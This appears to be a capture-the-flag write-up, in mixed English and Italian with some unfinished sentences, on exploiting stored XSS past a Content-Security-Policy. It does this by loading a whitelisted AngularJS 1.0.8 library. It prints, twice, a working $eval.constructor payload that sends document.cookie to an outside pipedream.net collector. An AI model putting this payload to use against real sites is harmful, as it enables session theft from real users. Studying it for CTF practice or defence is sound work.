@@ -1,0 +1,53 @@
+//for the url we need to use request.bin and fetch doesn't work
+
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
+<div ng-app ng-csp>
+    {{$eval.constructor("document.location='https://enhh5mt7winb.x.pipedream.net/?'+document.cookie")()}}
+</div>
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
+useful link with all the payload to make xss with angular and angularJS (the version of the library matter)
+
+First of all, try all the inputs: <script>alert(1)</script> to see which input section is vulnerable (quick way)
+you need to change the number for each inputs (in alert)
+Notice that in the first page, they are interpreted as text so no xss here.
+In the second page (pool something), a comment is not printed. If it is not printed, probably it's code. Inspect the element to be sure
+If you don't know if the challenge is csp: usually, if you need to steal the cookies, it's xss
+In this challenge there is a bot that will open the page that you sent. If there are scripts, they will be executed(xss included)
+The trick is to make the bot goes there and we will check with a proxy all the get requests and in one of them there will be the flag
+Content-Security-Policy allows you to use javascript only if it comes from the specified links
+you can check it with inspect element -> network -> f5 -> header(intestazione)
+there you will find the Content-Security-Policy and 
+(notice that CSP blocks the previous alert, that's why you cannot use directly xss)
+So, you go in the list and you look for the right script to use:
+	<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
+and then we will build a payload to get the cookies:
+	<div ng-app ng-csp>
+    		{{$eval.constructor("document.location='https://enhh5mt7winb.x.pipedream.net/?'+document.cookie")()}}
+	</div>
+ng-app ng-csp -> directive html (depend on the library) -> mette del jv al posto del codice angular
+necessita delle {} for angular
+https://enhh5mt7winb.x.pipedream.net è invece 
+document.location va a chiamare il link segnato in seguito
+
+For the redirectory, I used pipedream website and i copypasted the link of the pool page of the challenge on this website. So,
+i will be able to see all the get/post requests. 
+Notice that the bot will have the same injection in the original code because it is a stored based xss, so we are actually injecting 
+in the database and when the bot will go to the link, it will retrieve the same injection from the database. You can notice it by
+refreshing the page in stealth mode.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
